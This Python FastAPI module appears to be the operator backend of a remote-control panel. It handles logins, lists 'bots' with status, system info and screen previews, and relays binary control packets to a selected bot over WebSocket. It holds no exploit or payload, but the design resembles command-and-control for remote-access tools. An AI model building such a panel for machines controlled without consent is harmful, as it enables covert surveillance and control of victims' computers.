# backend/API/api.py

import json
import uvicorn
import asyncio
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, WebSocket, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse, JSONResponse

import backend.LoggerWrapper as logger
from backend.Config import FRONTEND_PATH
from backend.Database import db_get_users, db_get_bots
from .auth_service import verify_user, get_login_by_token, generate_token
from .connection_manager import manager
from backend.Services import (
    pack_packet, 
    has_access, 
    active_clients, 
    preview_cache, 
    send_binary_to_bot
)

app: FastAPI = FastAPI()
app.mount("/sidebar", StaticFiles(directory=FRONTEND_PATH, html=True), name="static")

@app.get("/")
async def root() -> RedirectResponse:
    return RedirectResponse("/sidebar/auth/auth.html")

@app.get("/verify_token")
async def verify(token: Optional[str] = None) -> Any:
    if (login := get_login_by_token(token)):
        return {"status": "ok", "login": login}
    return JSONResponse(status_code=401, content={"status": "err"})

@app.post("/login")
async def auth(data: Dict[str, Any] = Body(...)) -> Any:
    login_name = data.get("login", "")
    password_text = data.get("password", "")
    
    if (user := verify_user(login_name, password_text)):
        logger.Log.info(f"[API] User {login_name} logged in")
        return {
            "status": "ok",
            "token": generate_token(login_name),
            "role": user["role"],
            "prefix": user["prefix"]
        }
    return JSONResponse(status_code=401, content={"status": "error", "message": "Invalid credentials"})

@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket, 
    token: str, 
    login: str, 
    mode: Optional[str] = None, 
    target: Optional[str] = None
) -> None:
    user_login = get_login_by_token(token)
    
    if not user_login or user_login != login:
        await websocket.accept()
        await websocket.close(code=1008)
        return

    user_data = db_get_users().get(user_login)
    if not user_data or not await manager.connect(websocket, user_login, user_data):
        return

    try:
        await sync_state(websocket, user_data)

        # Режим управления конкретным ботом
        if mode == "control" and target and has_access(user_data, target):
            bot_db = db_get_bots().get(target, {})
            bot_status = "online" if target in active_clients else "offline"
            bot_db.update({"status": bot_status, "id": target})
            
            await websocket.send_bytes(pack_packet(target, "SystemInfo:None", json.dumps(bot_db).encode()))
            
            if target in preview_cache:
                await websocket.send_bytes(pack_packet(target, "Preview:None", preview_cache[target]))

        while True:
            packet_bytes = await websocket.receive_bytes()
            if len(packet_bytes) >= 6:
                id_len = packet_bytes[0]
                target_id = packet_bytes[6 : 6 + id_len].decode(errors="ignore").strip()
                
                if has_access(user_data, target_id):
                    await send_binary_to_bot(target_id, packet_bytes)
                        
    except Exception as e:
        pass # Соединение закрыто штатно или по ошибке
    finally:
        manager.disconnect(websocket, user_login)

async def sync_state(websocket: WebSocket, user_data: Dict[str, Any]) -> None:
    """Первичная синхронизация ботов и превью."""
    try:
        database = db_get_bots()
        visible_bots = []
        user_login = user_data.get("login", "unknown")
        
        for bot_id, bot_info in database.items():
            if has_access(user_data, bot_id):
                bot_info["id"] = bot_id
                bot_info["status"] = "online" if bot_id in active_clients else "offline"
                visible_bots.append(bot_info)

        if visible_bots:
            await websocket.send_bytes(pack_packet("SERVER", "SystemInfo:None", json.dumps(visible_bots).encode()))
            logger.Log.info(f"[API] Synced {len(visible_bots)} bots to {user_login}")

        # Рассылка кэшированных превью
        for bot_id, img_bytes in preview_cache.items():
            if has_access(user_data, bot_id):
                await asyncio.sleep(0.01) 
                await websocket.send_bytes(pack_packet(bot_id, "Preview:None", img_bytes))
                
    except Exception as e:
        logger.Log.error(f"[API] Sync State Error: {e}")

async def run_fastapi_server(host: str, port: int) -> None:
    config = uvicorn.Config(
        app, host=host, port=port, log_config=None,
        ws_ping_interval=20, ws_ping_timeout=20
    )
    await uvicorn.Server(config).serve()